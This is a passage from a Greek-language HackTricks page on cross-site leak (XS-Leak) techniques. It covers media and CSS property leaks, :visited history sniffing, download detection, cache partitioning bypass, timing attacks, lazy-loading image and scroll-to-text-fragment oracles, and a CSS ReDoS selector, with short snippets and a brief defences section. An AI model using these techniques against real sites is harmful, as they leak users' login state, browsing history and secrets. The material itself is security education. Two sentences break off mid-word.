Ένα παράδειγμα αυτής της τεχνικής είναι ότι στο chrome, ένα **PDF** μπορεί να **ανιχνευθεί** με τη **μέτρηση κάδρων** επειδή χρησιμοποιείται εσωτερικά ένα `embed`. Υπάρχουν [Παράμετροι Ανοίγματος URL](https://bugs.chromium.org/p/chromium/issues/detail?id=64309#c113) που επιτρέπουν κάποιο έλεγχο επάνω στο περιεχόμενο όπως `zoom`, `view`, `page`, `toolbar` όπου αυτή η τεχνική θα μπορούσε να είναι ενδιαφέρουσα.

### Στοιχεία HTMLElements

* **Μέθοδοι Ενσωμάτωσης**: Στοιχεία HTML
* **Ανιχνεύσιμη Διαφορά**: Περιεχόμενο Σελίδας
* **Περισσότερες πληροφορίες**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/)
* **Σύνοψη:** Διαβάστε τη διαρρεύσασα τιμή για να διακρίνετε μεταξύ 2 πιθανών καταστάσεων
* **Παράδειγμα Κώδικα**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/), [https://xsinator.com/testing.html#Media%20Dimensions%20Leak](https://xsinator.com/testing.html#Media%20Dimensions%20Leak), [https://xsinator.com/testing.html#Media%20Duration%20Leak](https://xsinator.com/testing.html#Media%20Duration%20Leak)

Η διαρροή πληροφοριών μέσω στοιχείων HTML αποτελεί ανησυχία στην ασφάλεια του web, ειδικά όταν δημιουργούνται δυναμικά αρχεία πολυμέσων βασισμένα σε πληροφορίες χρήστη, ή όταν προστίθενται υδατογραφήματα, αλλάζοντας το μέγεθος του πολυμέσου. Αυτό μπορεί να εκμεταλλευτείται από επιτιθέμενους για να διακρίνουν μεταξύ πιθανών καταστάσεων αναλύοντας τις πληροφορίες που αποκαλύπτονται από συγκεκριμένα στοιχεία HTML.

### Πληροφορίες που Αποκαλύπτονται από Στοιχεία HTML

* **HTMLMediaElement**: Αυτό το στοιχείο αποκαλύπτει τους χρόνους `διάρκειας` και `buffered` του πολυμέσου, τα οποία μπορούν να προσπελαστούν μέσω της API του. [Διαβάστε περισσότερα για το HTMLMediaElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement)
* **HTMLVideoElement**: Αποκαλύπτει τα `videoHeight` και `videoWidth`. Σε ορισμένους περιηγητές, διατίθενται επιπλέον ιδιότητες όπως `webkitVideoDecodedByteCount`, `webkitAudioDecodedByteCount`, και `webkitDecodedFrameCount`, προσφέροντας περισσότερες λεπτομέρειες για το περιεχόμενο του πολυμέσου. [Διαβάστε περισσότερα για το HTMLVideoElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLVideoElement)
* **getVideoPlaybackQuality()**: Αυτή η συνάρτηση παρέχει λεπτομέρειες σχετικά με την ποιότητα αναπαραγωγής βίντεο, συμπεριλαμβανομένου του `totalVideoFrames`, το οποίο μπορεί να υποδείξει την ποσότητα των δεδομένων βίντεο που επεξεργάστηκαν. [Διαβάστε περισσότερα για το getVideoPlaybackQuality()](https://developer.mozilla.org/en-US/docs/Web/API/VideoPlaybackQuality)
* **HTMLImageElement**: Αυτό το στοιχείο διαρρέει το ύψος `height` και το πλάτος `width` μιας εικόνας. Ωστόσο, αν μια εικόνα είναι μη έγκυρη, αυτές οι ιδιότητες θα επιστρέψουν 0, και η λειτουργία `image.decode()` θα απορριφθεί, υποδεικνύοντας την αποτυχία φόρτωσης της εικόνας με σωστό τρόπο. [Διαβάστε περισσότερα για το HTMLImageElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement)

### Ιδιότητα CSS

* **Μέθοδοι Ενσωμάτωσης**: Στοιχεία HTML
* **Ανιχνεύσιμη Διαφορά**: Περιεχόμενο Σελίδας
* **Περισσότερες πληροφορίες**: [https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle](https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle), [https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html](https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html)
* **Σύνοψη:** Αναγνωρίστε τις διακυμάνσεις στη στυλιστική της ιστοσελίδας που συσχετίζονται με την κατάσταση ή τον χρήστη.
* **Παράδειγμα Κώδικα**: [https://xsinator.com/testing.html#CSS%20Property%20Leak](https://xsinator.com/testing.html#CSS%20Property%20Leak)

Οι web εφαρμογές μπορεί να αλλάξουν τη **στυλιστική της ιστοσελίδας ανάλογα με την κατάσταση της χρήσης**. Στη σελίδα του επιτιθέμενου μπορούν να ενσωματωθούν διασυνοριακά αρχεία CSS με το στοιχείο συνδέσμου HTML, και οι **κανόνες** θα **εφαρμοστούν** στη σελίδα του επιτιθέμενου. Αν μια σελίδα αλλάζει δυναμικά αυτούς τους κανόνες, ένας επιτιθέμενος μπορεί να **ανιχνεύσει** αυτές τις **διαφορές** ανάλογα με την κατάσταση του χρήστη.\
Ως τεχνική διαρροής, ο επιτιθέμενος μπορεί να χρησιμοποιήσει τη μέθοδο `window.getComputedStyle` για να **διαβάσει τις ιδιότητες CSS** ενός συγκεκριμένου στοιχείου HTML. Ως αποτέλεσμα, ένας επιτιθέμενος μπορεί να διαβάσει αυθαίρετες ιδιότητες CSS αν το στοιχείο και το όνομα της ιδιότητας είναι γνωστά.

### Ιστορικό CSS

* **Μέθοδοι Ενσωμάτωσης**: Στοιχεία HTML
* **Ανιχνεύσιμη Διαφορά**: Περιεχόμενο Σελίδας
* **Περισσότερες πληροφορίες**: [https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history](https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history)
* **Σύνοψη:** Ανιχνεύστε αν ο στυλ `:visited` εφαρμόζεται σε μια διεύθυνση URL υποδηλώνοντας ότι έχει ήδη επισκεφθεί
* **Παράδειγμα Κώδικα**: [http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html](http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html)

{% hint style="info" %}
Σύμφωνα με [**αυτό**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/), αυτό δεν λειτουργεί στο headless Chrome.
{% endhint %}

Ο επιλογέας CSS `:visited` χρησιμοποιείται για να δώσει διαφορετικό στυλ σε διευθύνσεις URL που έχουν προηγουμένως επισκεφθεί από τον χρήστη. Στο παρελθόν, η μέθοδος `getComputedStyle()` θα μπορούσε να χρησιμοποιηθε

### ContentDocument X-Frame Διαρροή

* **Μέθοδοι Ενσωμάτωσης**: Frames
* **Ανιχνεύσιμη Διαφορά**: Κεφαλίδες
* **Περισσότερες πληροφορίες**: [https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf](https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf)
* **Σύνοψη:** Στο Google Chrome, εμφανίζεται μια αφιερωμένη σελίδα σφάλματος όταν μια σελίδα αποκλείεται από το να ενσωματωθεί σε μια τοποθεσία διασταύρωσης λόγω περιορισμών X-Frame-Options.
* **Παράδειγμα Κώδικα**: [https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak](https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak)

Στο Chrome, εάν μια σελίδα με την κεφαλίδα `X-Frame-Options` ρυθμισμένη σε "deny" ή "same-origin" ενσωματωθεί ως αντικείμενο, εμφανίζεται μια σελίδα σφάλματος. Το Chrome επιστρέφει μοναδικά ένα κενό αντικείμενο εγγράφου (αντί για `null`) για την ιδιότητα `contentDocument` αυτού του αντικειμένου, αντίθετα από τα iframes ή άλλους περιηγητές. Οι επιτιθέμενοι θα μπορούσαν να εκμεταλλευτούν αυτό εντοπίζοντας το κενό έγγραφο, αποκαλύπτοντας πιθανώς πληροφορίες σχετικά με την κατάσταση του χρήστη, ειδικά εάν οι προγραμματιστές ρυθμίζουν ανεπαρκώς την κεφαλίδα X-Frame-Options, παραβλέποντας συχνά τις σελίδες σφάλματος. Η ευαισθητοποίηση και η συνεπής εφαρμογή των κεφαλίδων ασφαλείας είναι ζωτικής σημασίας για την πρόληψη τέτοιων διαρροών.

### Ανίχνευση Λήψης

* **Μέθοδοι Ενσωμάτωσης**: Frames, Αναδυόμενα παράθυρα
* **Ανιχνεύσιμη Διαφορά**: Κεφαλίδες
* **Περισσότερες πληροφορίες**: [https://xsleaks.dev/docs/attacks/navigations/#download-trigger](https://xsleaks.dev/docs/attacks/navigations/#download-trigger)
* **Σύνοψη:** Ένας επιτιθέμενος μπορεί να διακρίνει τις λήψεις αρχείων εκμεταλλευόμενος τα iframes· η συνεχής πρόσβαση στο iframe υπονοεί επιτυχημένη λήψη αρχείου.
* **Παράδειγμα Κώδικα**: [https://xsleaks.dev/docs/attacks/navigations/#download-bar](https://xsleaks.dev/docs/attacks/navigations/#download-bar)

Η κεφαλίδα `Content-Disposition`, ειδικά `Content-Disposition: attachment`, οδηγεί τον περιηγητή να λήψει το περιεχόμενο αντί να το εμφανίσει ενσωματωμένο. Αυτή η συμπεριφορά μπορεί να εκμεταλλευτεί για να ανιχνευθεί εάν ένας χρήστης έχει πρόσβαση σε μια σελίδα που ενεργοποιεί μια λήψη αρχείου. Στους περιηγητές βασισμένους σε Chromium, υπάρχουν μερικές τεχνικές για την ανίχνευση αυτής της συμπεριφοράς λήψης:

1. **Παρακολούθηση Γραμμής Λήψης**:

* Όταν ένα αρχείο κατεβαίνει σε περιηγητές βασισμένους σε Chromium, εμφανίζεται μια γραμμή λήψης στο κάτω μέρος του παραθύρου του περιηγητή.
* Με την παρακολούθηση των αλλαγών στο ύψος του παραθύρου, οι επιτιθέμενοι μπορούν να συμπεράνουν την εμφάνιση της γραμμής λήψης, υπονοώντας ότι μια λήψη έχει ξεκινήσει.

2. **Πλοήγηση Λήψης με Iframes**:

* Όταν μια σελίδα ενεργοποιεί μια λήψη αρχείου χρησιμοποιώντας την κεφαλίδα `Content-Disposition: attachment`, δεν προκαλεί γεγονός πλοήγησης.
* Φορτώνοντας το περιεχόμενο σε ένα iframe και παρακολουθώντας τα γεγονότα πλοήγησης, είναι δυνατό να ελεγχθεί εάν η κατάσταση του περιεχομένου προκαλεί λήψη αρχείου (χωρίς πλοήγηση) ή όχι.

3. **Πλοήγηση Λήψης χωρίς Iframes**:

* Παρόμοια με την τεχνική του iframe, αυτή η μέθοδος περιλαμβάνει τη χρήση του `window.open` αντί για ένα iframe.
* Η παρακολούθηση των γεγονότων πλοήγησης στο νεοανοιγμένο παράθυρο μπορεί να αποκαλύψει εάν μια λήψη αρχείου έχει ενεργοποιηθεί (χωρίς πλοήγηση) ή αν το περιεχόμενο εμφανίζεται ενσωματωμένο (προκαλείται πλοήγηση).

Σε περιπτώσεις όπου μόνο συνδεδεμένοι χρήστες μπορούν να ενεργοποιήσουν τέτοιες λήψεις, αυτές οι τεχνικές μπορούν να χρησιμοποιηθούν για να εμμέσως εξάγουν πληροφορίες για την κατάσταση πιστοποίησης του χρήστη με βάση την αντίδραση του περιηγητή στο αίτημα λήψης.

### Διαφυγή Χωρισμένης Προσωρινής Μνήμης HTTP <a href="#partitioned-http-cache-bypass" id="partitioned-http-cache-bypass"></a>

* **Μέθοδοι Ενσωμάτωσης**: Αναδυόμενα παράθυρα
* **Ανιχνεύσιμη Διαφορά**: Χρονισμός
* **Περισσότερες πληροφορίες**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass)
* **Σύνοψη:** Ένας επιτιθέμενος μπορεί να διακρίνει τις λήψεις αρχείων εκμεταλλευόμενος τα iframes· η συνεχής πρόσβαση στο iframe υπονοεί επιτυχημένη λήψη αρχείου.
* **Παράδειγμα Κώδικα**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass), [https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722](https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722) (από [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))

{% hint style="warning" %}
Γι' αυτό η τεχνική αυτή είναι ενδιαφέρουσα: Το Chrome τώρα έχει **χωρισμό προσωρινής μνήμης**, και το κλειδί προσωρινής μνήμης της νεοανοιγμένης σελίδας είναι: `(https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m =xxx)`, αλλά αν ανοίξω μια σελίδα ngrok και χρησιμοποιήσω fetch σε αυτή, το κλειδί προσωρινής μνήμης θα είναι: `(https://myip.ngrok.io, https://myip.ngrok.io, https://sustenance.web.actf.co/?m=xxx)`, το **κλειδί προσωρινής μνήμης είναι διαφορετικό**, έτσι η προσωρινή μνήμη δεν μπορεί να κοινοποιηθεί. Μπορείτε να βρείτε περισσότερες λεπτομέρειες εδώ: [Απόκτηση ασφάλειας και ιδιωτικότητας με τον χωρισμό της προσωρινής μνήμης](https://developer.chrome.com/blog/http-cache-partitioning/)\
(Σχόλιο από [**εδώ**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))
{% endhint %}

Εάν μια τοποθεσία `παράδειγμα.com` περιλαμβάνει ένα πόρο από `*.παράδειγμα.com/πόρος` τότε αυτός ο πόρος θα έχει το **ίδιο κλειδί προσωρινής μνήμης** όπως αν ο πόρος αιτείται άμεσα μέσω πλοήγησης σε επίπεδο κορυφαίας διεύθυνσης. Αυτό συμβαίνει επειδή το κλειδί προσωρινής μνήμης αποτελείται από το _eTLD+1_ σε επίπεδο κορυφαίας διεύθυνσης κ

### Ρύπανση Σεναρίου

* **Μέθοδοι Ενσωμάτωσης**: Στοιχεία HTML (script)
* **Ανιχνεύσιμη Διαφορά**: Περιεχόμενο Σελίδας
* **Περισσότερες Πληροφορίες**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)
* **Σύνοψη:** Είναι δυνατόν να **αντικατασταθούν ενσωματωμένες λειτουργίες** και να διαβαστούν οι παράμετροί τους από **σενάριο διαφορετικής προέλευσης** (το οποίο δεν μπορεί να διαβαστεί απευθείας), κάτι που μπορεί να **διαρρεύσει πολύτιμες πληροφορίες**.
* **Παράδειγμα Κώδικα**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)

### Εργαζόμενοι Υπηρεσίας <a href="#service-workers" id="service-workers"></a>

* **Μέθοδοι Ενσωμάτωσης**: Αναδυόμενα Παράθυρα
* **Ανιχνεύσιμη Διαφορά**: Περιεχόμενο Σελίδας
* **Περισσότερες Πληροφορίες**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers)
* **Σύνοψη:** Μέτρηση του χρόνου εκτέλεσης μιας ιστοσελίδας χρησιμοποιώντας τους εργαζόμενους υπηρεσίας.
* **Παράδειγμα Κώδικα**:

Στο δεδομένο σενάριο, ο επιτιθέμενος αναλαμβάνει την πρωτοβουλία να εγγράψει έναν **εργαζόμενο υπηρεσίας** σε έναν από τους τομείς τους, συγκεκριμένα "attacker.com". Στη συνέχεια, ο επιτιθέμενος ανοίγει ένα νέο παράθυρο στην ιστοσελίδα-στόχο από τον κύριο εγγραφής και οδηγεί τον **εργαζόμενο υπηρεσίας** να ξεκινήσει ένα χρονόμετρο. Καθώς το νέο παράθυρο αρχίζει να φορτώνει, ο επιτιθέμενος πλοηγείται στην αναφορά που λήφθηκε στο προηγούμενο βήμα σε μια σελίδα που διαχειρίζεται ο **εργαζόμενος υπηρεσίας**.

Κατά την άφιξη του αιτήματος που ξεκίνησε στο προηγούμενο βήμα, ο **εργαζόμενος υπηρεσίας** απαντά με έναν κωδικό κατάστασης **204 (Χωρίς Περιεχόμενο)**, τερματίζοντας αποτελεσματικά τη διαδικασία πλοήγησης. Σε αυτό το σημείο, ο **εργαζόμενος υπηρεσίας** καταγράφει μια μέτρηση από το χρονόμετρο που ξεκίνησε νωρίτερα στο δεύτερο βήμα. Αυτή η μέτρηση επηρεάζεται από τη διάρκεια του JavaScript που προκαλεί καθυστερήσεις στη διαδικασία πλοήγησης.

{% hint style="warning" %}
Σε μια χρονομέτρηση εκτέλεσης είναι δυνατόν να **εξαλειφθούν** **παράγοντες δικτύου** για να ληφθούν **πιο ακριβείς μετρήσεις**. Για παράδειγμα, φορτώνοντας τους πόρους που χρησιμοποιούνται από τη σελίδα πριν τη φόρτωσή της.
{% endhint %}

### Χρονομέτρηση Ανάκτησης

* **Μέθοδοι Ενσωμάτωσης**: Ανάκτηση Fetch API
* **Ανιχνεύσιμη Διαφορά**: Χρονομέτρηση (συνήθως λόγω Περιεχόμενου Σελίδας, Κωδικού Κατάστασης)
* **Περισσότερες Πληροφορίες**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)
* **Σύνοψη:** Χρησιμοποιήστε το [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) για να μετρήσετε τον χρόνο που απαιτείται για να πραγματοποιηθεί μια αίτηση. Μπορούν να χρησιμοποιηθούν και άλλα ρολόγια.
* **Παράδειγμα Κώδικα**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)

### Χρονομέτρηση Διαστήματος Παραθύρου

* **Μέθοδοι Ενσωμάτωσης**: Ανάκτηση Fetch API
* **Ανιχνεύσιμη Διαφορά**: Χρονομέτρηση (συνήθως λόγω Περιεχόμενου Σελίδας, Κωδικού Κατάστασης)
* **Περισσότερες Πληροφορίες**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)
* **Σύνοψη:** Χρησιμοποιήστε το [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) για να μετρήσετε τον χρόνο που απαιτείται για να πραγματοποιηθεί μια αίτηση χρησιμοποιώντας το `window.open`. Μπορούν να χρησιμοποιηθούν και άλλα ρολόγια.
* **Παράδειγμα Κώδικα**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) για να δημιουργήσετε εύκολα και να **αυτοματοποιήσετε ροές εργασίας** με τα πιο προηγμένα εργαλεία της παγκόσμιας κοινότητας.\
Αποκτήστε Πρόσβαση Σήμερα:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Με HTML ή Επαναενσωμάτωση

Εδώ μπορείτε να βρείτε τεχνικές για την εξαγωγή πληροφοριών από μια σελίδα HTML διαφορετικής προέλευσης **ενσωματώνοντας περιεχόμενο HTML**. Αυτές οι τεχνικές είναι ενδιαφέρουσες σε περιπτώσεις όπου για οποιονδήποτε λόγο μπορείτε να **ενσωματώσετε HTML αλλά δεν μπορείτε να ενσωματώσετε κώδικα JS**.

### Κρεμασμένο Σήμανση

{% content-ref url="../dangling-markup-html-scriptless-injection/" %}
[dangling-markup-html-scriptless-injection](../dangling-markup-html-scriptless-injection/)
{% endcontent-ref %}

### Αργή Φόρτωση Εικόνας

Αν χρειάζεστε να **εξάγετε περιεχόμενο** και μπορείτε να **προσθέσετε HTML πριν το μυστικό** πρέπει να ελέγξετε τις **κοινές τεχνικές κρεμασμένου σήμανσης**.\
Ωστόσο, αν για οποιονδήποτε λόγο **ΠΡΕΠΕΙ** να το κάνετε **χαρακτήρα προς χαρακτήρα** (ίσως η επικοινωνία γίνεται μέσω ενός cache hit) μπορείτε να χρησιμοποιήσετε αυτό το κόλπο.

Οι **Εικόνες** σε HTML έχουν ένα χαρακτηριστικό "**φόρτωσης**" του οποίου η τιμή μπορεί να είναι "**lazy**". Σε αυτήν την περίπτωση, η εικόνα θα φορτωθεί όταν προβληθεί και όχι κατά τη φόρτωση της σελίδας:

```html
<img src=/something loading=lazy >
```

Συνεπώς, αυτό που μπορείτε να κάνετε είναι να **προσθέσετε πολλούς χαρακτήρες αχρήστους** (Για παράδειγμα **χιλιάδες "W"**) για να **γεμίσετε την ιστοσελίδα πριν το μυστικό ή να προσθέσετε κάτι σαν** `<br><canvas height="1850px"></canvas><br>.`\
Έπειτα, αν για παράδειγμα η **ενσωμάτωσή μας εμφανιστεί πριν τη σημαία**, η **εικόνα** θα **φορτωθεί**, αλλά αν εμφανιστεί **μετά** τη **σημαία**, η σημαία συν τα αχρήστα θα **την εμποδίσουν από το να φορτωθεί** (θα πρέπει να πειραματιστείτε με το πόσα αχρήστα να τοποθετήσετε). Αυτό συνέβη στο [**συγκεκριμένο άρθρο**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/).

Μια άλλη επιλογή θα μπορούσε να είναι η χρήση του **scroll-to-text-fragment** αν επιτρέπεται:

#### Scroll-to-text-fragment

Ωστόσο, μπορείτε να κάνετε το **ρομπότ να έχει πρόσβαση στη σελίδα** με κάτι παρόμοιο με

```
#:~:text=SECR
```

Έτσι η ιστοσελίδα θα είναι κάτι σαν: **`https://victim.com/post.html#:~:text=SECR`**

Όπου το post.html περιέχει τα ανεπιθύμητα χαρακτήρες του επιτιθέμενου και μια εικόνα φόρτωσης και στη συνέχεια προστίθεται το μυστικό του bot.

Αυτό το κείμενο θα κάνει το bot να έχει πρόσβαση σε οποιοδήποτε κείμενο στη σελίδα που περιέχει το κείμενο `SECR`. Καθώς αυτό το κείμενο είναι το μυστικό και βρίσκεται **ακριβώς κάτω από την εικόνα**, η **εικόνα θα φορτωθεί μόνο εάν το μυστικό που μαντέψαμε είναι σωστό**. Έτσι έχετε τον οράκελό σας για **εξαγωγή του μυστικού χαρακτήρα προς τον χαρακτήρα**.

Κάποιο παράδειγμα κώδικα για να εκμεταλλευτείτε αυτό: [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)

### Χρόνος Φόρτωσης Εικόνας με Lazy Loading

Εάν **δεν είναι δυνατή η φόρτωση μιας εξωτερικής εικόνας** που θα μπορούσε να υποδείξει στον επιτιθέμενο ότι η εικόνα φορτώθηκε, μια άλλη επιλογή θα ήταν να **προσπαθήσετε να μαντέψετε τον χαρακτήρα αρκετές φορές και να το μετρήσετε**. Εάν η εικόνα φορτώνεται, όλα τα αιτήματα θα διαρκούν περισσότερο από ό,τι αν η εικόνα δεν φορτώνεται. Αυτό είναι αυτό που χρησιμοποιήθηκε στη [**λύση αυτού του writeup**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/) **που περιλαμβάνεται εδώ:**

{% content-ref url="event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

### ReDoS

{% content-ref url="../regular-expression-denial-of-service-redos.md" %}
[regular-expression-denial-of-service-redos.md](../regular-expression-denial-of-service-redos.md)
{% endcontent-ref %}

### CSS ReDoS

Εάν χρησιμοποιείται το `jQuery(location.hash)`, είναι δυνατό να ανακαλυφθεί μέσω της χρονομέτρησης **αν κάποιο περιεχόμενο HTML υπάρχει**, αυτό οφείλεται στο γεγονός ότι εάν το επιλογέας `main[id='site-main']` δεν ταιριάζει δεν χρειάζεται να ελεγχθούν τα υπόλοιπα **επιλογείς**:

```javascript
$("*:has(*:has(*:has(*)) *:has(*:has(*:has(*))) *:has(*:has(*:has(*)))) main[id='site-main']")
```

### Ενσωμάτωση CSS

{% content-ref url="css-injection/" %}
[css-injection](css-injection/)
{% endcontent-ref %}

## Άμυνες

Υπάρχουν μειώσεις που συνιστώνται στο [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) επίσης σε κάθε ενότητα του wiki [https://xsleaks.dev/](https://xsleaks.dev/). Ρίξτε μια ματιά εκεί για περισσότερες πληροφορίες σχετικά με το πώς να προστατευτείτε από αυτές τις τεχνικές.

## Αναφορές

* [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)
* [https://xsleaks.dev/](https://xsleaks.dev)
* [https://github.com/xsleaks/xsleaks](https://github.com/xsleaks/xsleaks)
* [https://xsinator.com/](https://xsinator.com/)
* [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**Την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο GitHub.

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) για να δημιουργήσετε εύκολα και να **αυτοματοποιήσετε ροές εργασίας** με τα πιο προηγμένα εργαλεία κοινότητας στον κόσμο.\
Αποκτήστε πρόσβαση σήμερα:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
